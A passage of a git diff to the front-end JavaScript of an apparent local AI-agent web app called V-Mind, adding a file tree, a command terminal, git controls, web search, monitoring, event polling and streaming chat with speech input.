+    el.innerHTML=renderTree(d)
+  }catch(ex){el.textContent='Error: '+ex.message}
+}
+function renderTree(items,depth=0){
+  if(!items||!Array.isArray(items))return'<div style="color:var(--dim);padding:8px;font-size:11px">Empty</div>'
+  return items.map(i=>{
+    if(i.type==='dir')return'<div class="ft-item" style="padding-left:'+(8+depth*16)+'px" onclick="toggleDir(this,\''+escJs(i.path)+'\')"><span class="ft-arrow">&#9654;</span><span class="ft-icon">&#128193;</span>'+esc(i.name)+'</div><div class="ft-children" style="display:none"></div>'
+    return'<div class="ft-item" style="padding-left:'+(8+depth*16)+'px" onclick="openFile(\''+escJs(i.path)+'\')"><span class="ft-icon">&#128196;</span>'+esc(i.name)+'</div>'
+  }).join('')
+}
+async function toggleDir(el,path){
+  let children=el.nextElementSibling
+  if(!children||children.style.display==='block'){children.style.display=children.style.display==='block'?'none':'block';el.querySelector('.ft-arrow').innerHTML=children.style.display==='block'?'&#9660;':'&#9654;';return}
+  el.querySelector('.ft-arrow').innerHTML='&#9660;'
+  try{
+    let r=await fetch('/api/files?dir='+encodeURIComponent(path))
+    let d=await r.json()
+    if(d.error){children.innerHTML='<div style="color:var(--red);padding:8px;font-size:11px">'+esc(d.error)+'</div>';children.style.display='block';return}
+    children.innerHTML=renderTree(d,path.replace(/\\/g,'/').split('/').length);children.style.display='block'
+  }catch(ex){el.querySelector('.ft-arrow').innerHTML='&#9654;'}
+}
+
+// --- TERMINAL ---
+function toggleTerminal(){let t=document.getElementById('terminal');t.classList.toggle('active');if(t.classList.contains('active'))document.getElementById('t-input').focus()}
+async function sendCommand(){
+  let inp=document.getElementById('t-input'),cmd=inp.value.trim()
+  if(!cmd)return
+  let out=document.getElementById('t-out')
+  out.innerHTML+='\n<span class="t-in">$ '+esc(cmd)+'</span>';inp.value='';out.scrollTop=out.scrollHeight
+  try{
+    let r=await fetch('/api/exec',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:cmd})})
+    let d=await r.json()
+    if(d.error)out.innerHTML+='\n<span class="t-err">Error: '+esc(d.error)+'</span>'
+    else{if(d.stdout)out.innerHTML+='\n'+esc(d.stdout);if(d.stderr)out.innerHTML+='\n<span class="t-err">'+esc(d.stderr)+'</span>';if(d.returncode!==0&&!d.stderr)out.innerHTML+='\n<span class="t-err">exit code: '+d.returncode+'</span>'}
+    out.scrollTop=out.scrollHeight
+  }catch(ex){out.innerHTML+='\n<span class="t-err">Error: '+esc(ex.message)+'</span>';out.scrollTop=out.scrollHeight}
+}
+
+// --- REVIEW TAB SWITCH ---
+function switchReviewTab(tab,btn){
+  document.querySelectorAll('#rev-tabs button').forEach(b=>b.classList.remove('active'))
+  document.querySelectorAll('.rtab').forEach(r=>r.classList.remove('active'))
+  if(btn)btn.classList.add('active')
+  let rt=document.getElementById('rtab-'+tab)
+  if(rt)rt.classList.add('active')
+  if(tab==='git'){refreshMiniGit();document.getElementById('git-commit-bar').style.display='none'}
+  if(tab==='code'&&currentFile)openFile(currentFile)
+  if(tab==='events'){pollEvents();if(eventsPoll)clearInterval(eventsPoll);eventsPoll=setInterval(pollEvents,2000)}
+  else{if(eventsPoll){clearInterval(eventsPoll);eventsPoll=null}}
+}
+
+// --- GIT ---
+async function refreshMiniGit(){
+  let gc=document.getElementById('git-content')
+  gc.innerHTML='<span style="color:var(--dim)">loading...</span>'
+  try{
+    let sr=await fetch('/api/git/status');let sd=await sr.json()
+    if(sd.error){gc.innerHTML='<span style="color:var(--red)">'+sd.error+'</span>';return}
+    document.getElementById('git-branch').textContent='Branch: '+sd.branch
+    document.getElementById('git-remote').textContent=sd.remote||''
+    if(sd.files.length===0){gc.innerHTML='<span style="color:var(--dim)">No changes</span>';return}
+    gc.innerHTML='<div style="margin-bottom:3px;font-size:10px;color:var(--dim)">'+sd.files.length+' changed</div>'+
+      sd.files.map(f=>'<div class="git-file" onclick="showMiniDiff(\''+escJs(f.path)+'\')"><span class="gst '+(f.status==='?'?'??':f.status)+'">'+f.status+'</span><span>'+esc(f.path)+'</span></div>').join('')+
+      '<div id="git-diff-area"></div>'
+  }catch(ex){gc.innerHTML='<span style="color:var(--red)">'+ex.message+'</span>'}
+}
+async function showMiniDiff(file){
+  let area=document.getElementById('git-diff-area')
+  area.innerHTML='<span style="color:var(--dim)">loading diff...</span>'
+  try{
+    let r=await fetch('/api/git/diff?file='+encodeURIComponent(file))
+    let d=await r.json()
+    if(d.diff)area.innerHTML='<div class="git-diff">'+esc(diffHighlight(d.diff))+'</div>'
+    else area.innerHTML='<span style="color:var(--dim)">no diff</span>'
+  }catch(ex){area.innerHTML='<span style="color:var(--red)">'+ex.message+'</span>'}
+}
+function diffHighlight(d){return d.split('\n').map(l=>{if(l.startsWith('+'))return'<span style="color:#3fb950">'+esc(l)+'</span>';if(l.startsWith('-'))return'<span style="color:#f85149">'+esc(l)+'</span>';if(l.startsWith('@@'))return'<span style="color:#58a6ff">'+esc(l)+'</span>';return esc(l)}).join('\n')}
+function showMiniGitTab(tab,btn){
+  document.querySelectorAll('#rtab-git .git-tab-btn').forEach(b=>b.classList.remove('active'))
+  if(btn)btn.classList.add('active')
+  let cb=document.getElementById('git-commit-bar')
+  if(tab==='commit'){cb.style.display='flex';document.getElementById('git-content').innerHTML='<span style="color:var(--dim)">Enter a commit message below.</span>';return}
+  cb.style.display='none'
+  if(tab==='log')showMiniLog()
+  else refreshMiniGit()
+}
+async function showMiniLog(){
+  let gc=document.getElementById('git-content')
+  gc.innerHTML='<span style="color:var(--dim)">loading...</span>'
+  try{
+    let r=await fetch('/api/git/log?limit=15');let d=await r.json()
+    if(d.error){gc.innerHTML='<span style="color:var(--red)">'+d.error+'</span>';return}
+    gc.innerHTML='<div class="git-log">'+d.commits.map(c=>'<div class="git-log-entry"><span class="glh">'+c.hash+'</span> <span class="glm">'+esc(c.message)+'</span></div>').join('')+'</div>'
+  }catch(ex){gc.innerHTML='<span style="color:var(--red)">'+ex.message+'</span>'}
+}
+async function gitCommit(){
+  let inp=document.getElementById('git-commit-input'),msg=inp.value.trim()
+  if(!msg)return;inp.disabled=true
+  try{
+    let r=await fetch('/api/git/commit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message:msg})})
+    let d=await r.json()
+    if(d.ok){inp.value='';showMiniGitTab('status',document.querySelector('#rtab-git .git-tab-btn'))}
+    else alert('Commit failed: '+d.error)
+  }catch(ex){alert('Error: '+ex.message)}
+  inp.disabled=false
+}
+function showGitSetup(){
+  fetch('/api/git/config').then(r=>r.json()).then(d=>{
+    document.getElementById('git-content').innerHTML='<div style="padding:8px;font-size:11px"><div style="margin-bottom:8px;font-weight:500">Git Config</div>'+
+      '<div style="margin-bottom:6px"><span style="color:var(--dim)">User:</span> <input id="cfg-name" value="'+esc(d.name||'')+'" style="width:160px;background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:3px 6px;color:var(--text);font-size:10px;font-family:inherit;outline:none;margin-left:4px"></div>'+
+      '<div style="margin-bottom:6px"><span style="color:var(--dim)">Email:</span> <input id="cfg-email" value="'+esc(d.email||'')+'" style="width:160px;background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:3px 6px;color:var(--text);font-size:10px;font-family:inherit;outline:none;margin-left:4px"></div>'+
+      '<div style="margin-bottom:6px"><span style="color:var(--dim)">Token:</span> <input id="cfg-token" type="password" placeholder="ghp_..." style="width:160px;background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:3px 6px;color:var(--text);font-size:10px;font-family:inherit;outline:none;margin-left:4px"></div>'+
+      '<div style="margin-bottom:6px"><span style="color:var(--dim)">Clone URL:</span> <input id="cfg-clone" placeholder="https://github.com/user/repo.git" style="width:220px;background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:3px 6px;color:var(--text);font-size:10px;font-family:inherit;outline:none;margin-left:4px"></div>'+
+      '<div style="margin-bottom:6px"><span style="color:var(--dim)">Clone dir:</span> <input id="cfg-clone-dir" placeholder="(optional)" style="width:120px;background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:3px 6px;color:var(--text);font-size:10px;font-family:inherit;outline:none;margin-left:4px"></div>'+
+      '<div style="display:flex;gap:4px;margin-top:6px"><button onclick="saveGitConfig()" style="padding:4px 12px;background:var(--accent);color:#000;border:none;border-radius:3px;font-weight:600;cursor:pointer;font-size:10px;font-family:inherit">Save</button><button onclick="gitClone()" style="padding:4px 12px;background:var(--green);color:#000;border:none;border-radius:3px;font-weight:600;cursor:pointer;font-size:10px;font-family:inherit">Clone</button></div>'+
+      '<div id="cfg-output" style="margin-top:6px;font-size:10px;color:var(--dim)"></div>'+
+      '<div style="margin-top:8px;color:var(--dim);font-size:9px">Remotes:<pre style="margin-top:2px;font-size:10px">'+esc(d.remotes||'(none)')+'</pre></div></div>'
+  }).catch(()=>document.getElementById('git-content').innerHTML='<span style="color:var(--red)">Error</span>')
+}
+async function saveGitConfig(){
+  let name=document.getElementById('cfg-name')?.value,email=document.getElementById('cfg-email')?.value,token=document.getElementById('cfg-token')?.value
+  let out=document.getElementById('cfg-output');out.textContent='Saving...'
+  try{let r=await fetch('/api/git/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name,email,token})});let d=await r.json();out.textContent=d.ok?'Saved':'Error: '+d.error}catch(e){out.textContent='Error: '+e.message}
+}
+async function gitClone(){
+  let url=document.getElementById('cfg-clone')?.value,dest=document.getElementById('cfg-clone-dir')?.value,out=document.getElementById('cfg-output')
+  if(!url){out.textContent='Enter a URL';return}
+  out.textContent='Cloning...'
+  try{let r=await fetch('/api/git/clone',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,dest})});let d=await r.json();if(d.ok){out.textContent='Cloned!';loadFileTree(document.getElementById('file-path-input').value||'.')}else out.textContent='Error: '+d.error}catch(e){out.textContent='Error: '+e.message}
+}
+async function gitPush(){let gc=document.getElementById('git-content');gc.innerHTML='<span style="color:var(--dim)">Pushing...</span>';try{let r=await fetch('/api/git/push',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({})});let d=await r.json();gc.innerHTML=d.ok?'<span style="color:var(--green)">Push successful</span><pre style="font-size:10px;margin-top:4px">'+esc(d.output||'')+'</pre>':'<span style="color:var(--red)">Push failed: '+esc(d.error||'')+'</span>'}catch(e){gc.innerHTML='<span style="color:var(--red)">Error: '+e.message+'</span>'}}
+async function gitPull(){let gc=document.getElementById('git-content');gc.innerHTML='<span style="color:var(--dim)">Pulling...</span>';try{let r=await fetch('/api/git/pull',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({})});let d=await r.json();gc.innerHTML=d.ok?'<span style="color:var(--green)">Pull successful</span><pre style="font-size:10px;margin-top:4px">'+esc(d.output||'')+'</pre>':'<span style="color:var(--red)">Pull failed: '+esc(d.error||'')+'</span>'}catch(e){gc.innerHTML='<span style="color:var(--red)">Error: '+e.message+'</span>'}}
+async function showBranchDialog(){
+  let gc=document.getElementById('git-content');gc.innerHTML='<span style="color:var(--dim)">Loading...</span>'
+  try{let r=await fetch('/api/git/branch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'list'})});let d=await r.json();let branches=(d.branches||[]).map(b=>esc(b.trim())).join('\n')
+    gc.innerHTML='<div style="padding:8px;font-size:11px"><div style="margin-bottom:6px;font-weight:500">Branches</div><pre style="background:var(--surface);padding:6px;border-radius:3px;font-size:10px;margin-bottom:6px;white-space:pre-wrap">'+(branches||'(none)')+'</pre><div style="margin-bottom:4px;display:flex;gap:4px"><input id="branch-name" placeholder="Branch name" style="flex:1;background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:3px 6px;color:var(--text);font-size:10px;font-family:inherit;outline:none"></div><div style="display:flex;gap:4px"><button onclick="gitBranch(\'create\')" style="padding:3px 10px;background:var(--green);color:#000;border:none;border-radius:3px;font-weight:600;cursor:pointer;font-size:10px;font-family:inherit">Create</button><button onclick="gitBranch(\'switch\')" style="padding:3px 10px;background:var(--accent);color:#000;border:none;border-radius:3px;font-weight:600;cursor:pointer;font-size:10px;font-family:inherit">Switch</button><button onclick="gitBranch(\'delete\')" style="padding:3px 10px;background:var(--red);color:#000;border:none;border-radius:3px;font-weight:600;cursor:pointer;font-size:10px;font-family:inherit">Delete</button></div><div id="branch-output" style="margin-top:4px;font-size:10px;color:var(--dim)"></div></div>'
+  }catch(e){gc.innerHTML='<span style="color:var(--red)">Error: '+e.message+'</span>'}
+}
+async function gitBranch(action){let name=document.getElementById('branch-name')?.value,out=document.getElementById('branch-output');if(!name&&action!=='list'){out.textContent='Enter name';return}out.textContent='Processing...';try{let r=await fetch('/api/git/branch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action,name})});let d=await r.json();if(d.ok){out.textContent='Done';refreshMiniGit()}else out.textContent='Error: '+d.error}catch(e){out.textContent='Error: '+e.message}}
+
+// --- V-SEARCH ---
+function switchGSearchTab(tab,btn){gsCurrentTab=tab;document.querySelectorAll('#gsearch-tabs button').forEach(b=>b.classList.remove('active'));if(btn)btn.classList.add('active');document.getElementById('gsearch-knowledge').style.display='none';if(gsLastQuery)gsearch()}
+function gAutoComplete(q){clearTimeout(gsSuggestTimer);let el=document.getElementById('gsearch-suggest');if(!q||q.length<2){el.style.display='none';return}gsSuggestTimer=setTimeout(async()=>{try{let r=await fetch('/api/suggest?q='+encodeURIComponent(q));let d=await r.json();if(!d.suggestions||!d.suggestions.length){el.style.display='none';return}el.innerHTML=d.suggestions.map(s=>'<div class="gs-sug-item" onclick="gsSetVal(\''+esc(s.replace(/'/g,"\\'"))+'\')">'+esc(s)+'</div>').join('');el.style.display='block'}catch(e){el.style.display='none'}},200)}
+function gsSetVal(v){document.getElementById('gsearch-input').value=v;document.getElementById('gsearch-suggest').style.display='none';gsearch()}
+async function gsearch(){
+  let inp=document.getElementById('gsearch-input'),q=inp.value.trim()
+  if(!q)return;gsLastQuery=q
+  document.getElementById('gsearch-suggest').style.display='none'
+  let res=document.getElementById('gsearch-results'),stats=document.getElementById('gsearch-stats'),know=document.getElementById('gsearch-knowledge')
+  know.style.display='none';stats.textContent='Searching...'
+  res.innerHTML='<div style="text-align:center;padding:20px;color:var(--dim)"><div style="font-size:24px;margin-bottom:8px">&#8987;</div>Searching...</div>'
+  try{
+    let r=await fetch('/api/web_search?q='+encodeURIComponent(q)+'&search_type='+gsCurrentTab)
+    let d=await r.json()
+    if(d.error){res.innerHTML='<div style="padding:20px;color:var(--red)">'+esc(d.error)+'</div>';stats.textContent='';return}
+    if(!d.results||!d.results.length){res.innerHTML='<div style="padding:30px;color:var(--dim);text-align:center">No results for "'+esc(q)+'"</div>';stats.textContent='';return}
+    stats.textContent=d.results.length+' results'
+    if(gsCurrentTab==='text'){
+      res.innerHTML=d.results.map((r,i)=>{let url=r.url||'',hostname='';try{hostname=new URL(url).hostname.replace(/^www\./,'')}catch(e){}return'<div class="gs-item"><a class="gs-title" href="#" onclick="gFetchUrl(\''+escJs(url)+'\');return false"><span class="gs-favicon">&#9733;</span>'+esc(r.title||'')+'</a><div class="gs-url">'+esc(hostname||url.slice(0,50))+'</div><div class="gs-snippet">'+esc(r.snippet||'')+'</div></div>'}).join('')
+      fetch('/api/knowledge?q='+encodeURIComponent(q)).then(r=>r.json()).then(k=>{if(k.title&&k.extract){know.innerHTML='<div class="gs-knowl-title">'+esc(k.title)+'</div>'+(k.description?'<div class="gs-knowl-desc">'+esc(k.description)+'</div>':'')+(k.thumbnail?'<img class="gs-knowl-img" src="'+esc(k.thumbnail)+'" loading="lazy">':'')+'<div class="gs-knowl-extract">'+esc(k.extract.slice(0,600))+'...</div>'+(k.url?'<a class="gs-knowl-link" href="'+esc(k.url)+'" target="_blank">Read more &#x2197;</a>':'');know.style.display='block'}}).catch(()=>{})
+    }else if(gsCurrentTab==='images'){
+      res.innerHTML='<div id="gsearch-images">'+d.results.map(r=>r.image?'<div class="gs-img-card" onclick="gFetchUrl(\''+escJs(r.url)+'\')"><img src="'+esc(r.image)+'" loading="lazy" onerror="this.style.display=\'none\'"><div class="gs-img-info">'+esc((r.title||'').slice(0,60))+'</div></div>':'').filter(Boolean).join('')+'</div>'
+    }else if(gsCurrentTab==='videos'){
+      res.innerHTML='<div id="gsearch-videos">'+d.results.map(r=>'<div class="gs-vid-card" onclick="gFetchUrl(\''+escJs(r.url)+'\')">'+(r.image?'<div class="gs-vid-thumb"><img src="'+esc(r.image)+'" loading="lazy">'+(r.duration?'<span class="gs-vid-duration">'+esc(r.duration)+'</span>':'')+'</div>':'')+'<div class="gs-vid-info"><div class="gs-vid-title">'+esc((r.title||'').slice(0,80))+'</div>'+(r.uploader?'<span class="gs-vid-meta">'+esc(r.uploader)+'</span>':'')+'</div></div>').join('')+'</div>'
+    }else if(gsCurrentTab==='news'){
+      res.innerHTML='<div id="gsearch-news">'+d.results.map(r=>'<div class="gs-news-item" onclick="gFetchUrl(\''+escJs(r.url)+'\')">'+(r.image?'<img class="gs-news-img" src="'+esc(r.image)+'" loading="lazy">':'<div class="gs-news-img" style="background:var(--surface);display:flex;align-items:center;justify-content:center;font-size:18px">&#128240;</div>')+'<div><div class="gs-news-title">'+esc((r.title||'').slice(0,100))+'</div><div class="gs-news-snippet">'+esc((r.snippet||'').slice(0,120))+'</div><div class="gs-news-meta">'+(r.source?'<span class="gs-source">'+esc(r.source)+'</span>':'')+(r.date?'<span class="gs-date">'+esc(r.date)+'</span>':'')+'</div></div></div>').join('')+'</div>'
+    }
+  }catch(ex){res.innerHTML='<div style="padding:20px;color:var(--red)">Error: '+esc(ex.message)+'</div>';stats.textContent=''}
+}
+async function gFetchUrl(url){
+  let res=document.getElementById('gsearch-results'),stats=document.getElementById('gsearch-stats'),know=document.getElementById('gsearch-knowledge')
+  know.style.display='none';stats.textContent=''
+  res.innerHTML='<div style="text-align:center;padding:20px;color:var(--dim)"><div style="font-size:24px">&#8987;</div>Loading...</div>'
+  try{
+    let r=await fetch('/api/fetch?url='+encodeURIComponent(url));let d=await r.json()
+    if(d.error){res.innerHTML='<div style="padding:16px;color:var(--red)">'+esc(d.error)+'</div>';return}
+    let c=d.content||''
+    if(c.length<20)c='<div style="padding:20px;color:var(--dim);text-align:center">Page requires JS. <a href="'+esc(url)+'" target="_blank" style="color:var(--accent);display:block;margin-top:8px">Open in browser &rarr;</a></div>'
+    else c='<div style="padding:12px;font-size:11px;line-height:1.7;white-space:pre-wrap;color:var(--text)">'+esc(c)+'</div>'
+    res.innerHTML='<div style="display:flex;align-items:center;gap:8px;padding:6px 10px;border-bottom:1px solid var(--border);font-size:11px"><button onclick="gsearch()" style="background:var(--surface);border:1px solid var(--border);padding:3px 10px;font-size:10px;cursor:pointer;color:var(--text);border-radius:4px;font-family:inherit">&larr; Back</button><span style="color:var(--dim);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1">'+esc(url.slice(0,80))+'</span><a href="'+esc(url)+'" target="_blank" style="color:var(--accent);font-size:10px;text-decoration:none">Open &#x2197;</a></div>'+c
+  }catch(ex){res.innerHTML='<div style="padding:16px;color:var(--red)">Error: '+esc(ex.message)+'</div>'}
+}
+
+// --- MONITOR ---
+async function toggleMonitor(){
+  let btn=document.getElementById('monitor-btn')
+  if(monitorPoll){await fetch('/api/monitor/stop',{method:'POST'});clearInterval(monitorPoll);monitorPoll=null;btn.textContent='Start Monitor';btn.style.background='var(--green)';document.getElementById('monitor-status').textContent='Stopped';return}
+  let r=await fetch('/api/monitor/start',{method:'POST'});let d=await r.json()
+  if(d.status==='started'||d.status==='already running'){
+    btn.textContent='Stop Monitor';btn.style.background='var(--red)';document.getElementById('monitor-status').textContent='Watching...'
+    monitorPoll=setInterval(async()=>{try{let r2=await fetch('/api/monitor/status');let d2=await r2.json();document.getElementById('monitor-count').textContent=d2.count+' captures';if(d2.error){let e=document.getElementById('monitor-error');e.textContent='Error: '+d2.error;e.style.display='block'}else{document.getElementById('monitor-error').style.display='none'}if(d2.latest){let o=document.getElementById('monitor-output');o.innerHTML='<div style="color:var(--accent);font-size:10px;margin-bottom:4px">Latest:</div>'+d2.latest+'<hr style="border-color:var(--border);margin:6px 0"><div style="color:var(--dim);font-size:10px;margin-bottom:4px">Previous:</div>'+d2.all.slice(0,-1).reverse().join('<hr style="border-color:var(--border);margin:4px 0">')}}catch(ex){}},2000)
   }
 }
 
-async function sendChat() {
-  let text = chatInput.value.trim();
-  if (!text || loading) return;
-  chatInput.value = '';
-  loading = true; sendBtn.disabled = true;
-  addMsg(text, 'user');
-  let msgEl = addMsg('Thinking...', 'assistant');
-  if (mode === 'api') await sendApiChat(text, msgEl);
-  else await sendBackendChat(text, msgEl);
-  loading = false; sendBtn.disabled = false; chatInput.focus();
+// --- SYSTEM ---
+async function runSysCmd(tool){let out=document.getElementById('sys-output');out.textContent='Running...';try{let r=await fetch('/api/sys_run?tool='+tool);let d=await r.json();out.textContent=d.result||d.error||'(no result)'}catch(ex){out.textContent='Error: '+ex.message}}
+async function runSysCmdCustom(){let inp=document.getElementById('sys-input'),text=inp.value.trim();if(!text)return;inp.value='';let out=document.getElementById('sys-output');out.textContent='Executing...';try{let r=await fetch('/api/exec',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:text,timeout:10})});let d=await r.json();out.textContent=d.stdout||d.stderr||d.error||'(no output)'}catch(ex){out.textContent='Error: '+ex.message}}
+async function generateProject(){
+  let desc=document.getElementById('project-input').value.trim(),dir=document.getElementById('project-dir').value.trim(),out=document.getElementById('project-output')
+  if(!desc){out.textContent='Describe your project first.';return}
+  out.textContent='Generating...'
+  try{let r=await fetch('/api/chat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message:'Create project: '+desc+'. Target: '+(dir||'(use name)')+'. Create all files.',session_id:'proj-gen',file_ids:[],mode:'spec',backend:'auto'})});let d=await r.json();out.innerHTML='<div style="color:var(--green);margin-bottom:6px">Done!</div>'+renderMarkdown(d.response)}catch(ex){out.textContent='Error: '+ex.message}
 }
 
-async function sendBackendChat(text, msgEl) {
-  try {
-    let r = await origFetch(backendUrl + '/api/chat/stream', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({message: text, session_id: 'vm-' + Date.now(), file_ids: [], mode: 'vibe', backend: 'auto', folder: ''}),
-      signal: AbortSignal.timeout(60000)
-    });
-    let reader = r.body.getReader();
-    let decoder = new TextDecoder();
-    let full = '';
-    while (true) {
-      let {done, value} = await reader.read();
-      if (done) break;
-      for (let line of decoder.decode(value).trim().split('\n')) {
-        try { let ev = JSON.parse(line); if (ev.type === 'token') { full += ev.content; msgEl.textContent = full; } else if (ev.type === 'done') full = ev.content || full; } catch(_) {}
+// --- EVENTS ---
+function pollEvents(){
+  fetch('/api/system/events').then(r=>r.json()).then(d=>{let el=document.getElementById('events-output'),countEl=document.getElementById('events-count');if(!d.events||!d.events.length){el.innerHTML='<div style="padding:8px;color:var(--dim);font-size:11px">No events.</div>';countEl.textContent='0 events';return}countEl.textContent=d.events.length+' events';el.innerHTML=d.events.map(e=>{let icon={file_created:'+',file_modified:'~',file_deleted:'X',process_started:'>',process_ended:'!',cpu_spike:'H',ram_spike:'M'}[e.kind]||'?';let color={file_created:'var(--green)',file_modified:'var(--accent)',file_deleted:'var(--red)',process_started:'var(--green)',process_ended:'var(--red)',cpu_spike:'#f0883e',ram_spike:'#f0883e'}[e.kind]||'var(--dim)';return'<div style="padding:4px 8px;font-size:10px;display:flex;gap:6px;align-items:center;border-bottom:1px solid var(--border)"><span style="color:'+color+';font-weight:700;width:16px">'+icon+'</span><span style="color:var(--dim);width:50px;flex-shrink:0">'+new Date(e.timestamp*1000).toLocaleTimeString()+'</span><span style="color:var(--text)">'+esc(e.detail)+'</span></div>'}).join('')}).catch(()=>{})
+}
+function clearEvents(){document.getElementById('events-output').innerHTML='<div style="padding:8px;color:var(--dim);font-size:11px">Cleared.</div>';document.getElementById('events-count').textContent='0 events'}
+
+// --- CHAT ---
+function renderMarkdown(t){
+  if(!t)return''
+  let id=0,map={}
+  let s=t.replace(/```[\s\S]*?```|`[^`\n]+`/g,m=>{let k='\x00M'+id+'\x00';map[k]=m;id++;return k})
+  s=esc(s)
+  s=s.replace(/\x00M(\d+)\x00/g,(_,n)=>{let c=map['\x00M'+n+'\x00'];if(!c)return'';if(c.startsWith('```')){let lang=c.match(/^```(\w*)/)?.[1]||'',code=c.replace(/^```\w*\n?/,'').replace(/```$/,''),co='<pre><code class="hljs">'+esc(code)+'</code></pre>';try{if(window.hljs)hljs.highlightElement(co.querySelector('code'))}catch(e){}return co+'<button class="cb-copy" onclick="copyCode(this)">Copy</button>'}return'<code>'+esc(c.replace(/^`|`$/g,''))+'</code>'})
+  s=s.replace(/^### (.+)$/gm,'<h3>$1</h3>');s=s.replace(/^## (.+)$/gm,'<h2>$1</h2>');s=s.replace(/^# (.+)$/gm,'<h1>$1</h1>');s=s.replace(/\*\*([^*]+)\*\*/g,'<b>$1</b>');s=s.replace(/\*([^*]+)\*/g,'<i>$1</i>');s=s.replace(/`([^`]+)`/g,'<code>$1</code>');s=s.replace(/\n{2,}/g,'</p><p>');s=s.replace(/\n/g,'<br>')
+  return '<p>'+s+'</p>'
+}
+function addMsg(text,role,files){let c=document.getElementById('chat-inner'),d=document.createElement('div');d.className='chat-msg '+role;d.innerHTML=renderMarkdown(text);c.appendChild(d);document.getElementById('chat-area').scrollTop=document.getElementById('chat-area').scrollHeight;return d}
+function copyCode(btn){let pre=btn.previousElementSibling;if(!pre||pre.tagName!='PRE')pre=btn.previousElementSibling?.previousElementSibling;let code=pre?.textContent||'';navigator.clipboard.writeText(code).then(()=>{btn.textContent='Copied!';setTimeout(()=>btn.textContent='Copy',1500)})}
+function renderFileChips(){let el=document.getElementById('file-preview');if(!pendingFiles.length){el.innerHTML='';return}el.innerHTML=pendingFiles.map((f,i)=>'<div class="file-chip" style="display:inline-flex;align-items:center;gap:4px;background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:3px 8px;font-size:11px;margin:2px 4px"><span>'+esc(f.name)+'</span><span class="rm" style="cursor:pointer;color:var(--dim)" onclick="removeFile('+i+')">x</span></div>').join('')}
+async function uploadFiles(files){for(let f of files){let fd=new FormData();fd.append('file',f);fd.append('session_id',sid);try{let r=await fetch('/api/upload',{method:'POST',body:fd});let d=await r.json();if(d.ok){pendingFiles.push(d.file);renderFileChips()}else addMsg('Upload error: '+d.error,'assistant')}catch(e){addMsg('Upload failed: '+e.message,'assistant')}}}
+function removeFile(i){pendingFiles.splice(i,1);renderFileChips()}
+function toggleSpeaker(){speechMuted=!speechMuted;localStorage.setItem('vmspeech',speechMuted?'muted':'unmuted');let btn=document.getElementById('speaker-btn');btn.classList.toggle('muted',speechMuted);if(speechMuted&&utterance){window.speechSynthesis.cancel();utterance=null}}
+function speakText(text){if(speechMuted||!text)return;window.speechSynthesis.cancel();utterance=new SpeechSynthesisUtterance(text.replace(/<[^>]*>/g,''));utterance.rate=1;utterance.pitch=1;utterance.volume=1;let voices=window.speechSynthesis.getVoices(),en=voices.find(v=>v.lang.startsWith('en'));if(en)utterance.voice=en;window.speechSynthesis.speak(utterance)}
+function toggleMic(){if(isRecording){stopMic();return}let SpeechRecognition=window.SpeechRecognition||window.webkitSpeechRecognition;if(!SpeechRecognition){addMsg('Speech not supported. Try Chrome.','assistant');return}recognition=new SpeechRecognition();recognition.lang='en-US';recognition.interimResults=true;recognition.continuous=true;let btn=document.getElementById('mic-btn');btn.classList.add('recording');isRecording=true;let finalTranscript='';recognition.onresult=function(e){let interim='';for(let i=e.resultIndex;i<e.results.length;i++){let t=e.results[i][0].transcript;if(e.results[i].isFinal)finalTranscript+=t+' ';else interim=t}document.getElementById('chat-input').value=finalTranscript+interim};recognition.onerror=function(){stopMic()};recognition.onend=function(){if(isRecording){recognition.start()}};recognition.start()}
+function stopMic(){isRecording=false;let btn=document.getElementById('mic-btn');btn.classList.remove('recording');if(recognition){recognition.onend=null;recognition.stop();recognition=null}document.getElementById('chat-input').focus()}
+function startChat(){document.getElementById('cover-page').classList.add('hidden');document.getElementById('chat-input').focus()}
+async function sendMsg(){
+  document.getElementById('cover-page').classList.add('hidden')
+  let inp=document.getElementById('chat-input'),text=inp.value.trim()
+  if((!text&&!pendingFiles.length)||loading)return
+  let fileIds=pendingFiles.map(f=>f.id),files=pendingFiles.slice()
+  pendingFiles=[];renderFileChips();inp.value='';loading=true;document.getElementById('send-btn').disabled=true
+  let header=text||'(attached files)'
+  if(files.length)header+=' ['+files.map(f=>f.name).join(', ')+']'
+  addMsg(header,'user')
+  try{
+    let folder=document.getElementById('file-path-input').value
+    let r
+    if(appMode==='api'){
+      const model=document.getElementById('modelSelect').value
+      const baseUrl=apiProvider==='openrouter'?'https://openrouter.ai/api/v1':'https://api.openai.com/v1'
+      r=await origFetch(baseUrl+'/chat/completions',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+apiKey,...(apiProvider==='openrouter'?{'HTTP-Referer':window.location.origin}:{})},body:JSON.stringify({model,messages:[{role:'system',content:'You are V-Mind, a super-intelligent AI agent.'},{role:'user',content:text+'. Project folder: '+folder}],stream:true}),signal:AbortSignal.timeout(60000)})
+      if(!r.ok){let err=await r.text();addMsg('API Error: '+(JSON.parse(err).error?.message||err),'assistant');loading=false;document.getElementById('send-btn').disabled=false;document.getElementById('chat-input').focus();return}
+    }else{
+      backendUrl=document.getElementById('backendUrl').value.replace(/\/+$/,'');localStorage.setItem('vmBackendUrl',backendUrl)
+      r=await fetch('/api/chat/stream',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message:text,session_id:sid,file_ids:fileIds,mode:currentMode,backend:'auto',folder}),signal:AbortSignal.timeout(60000)})
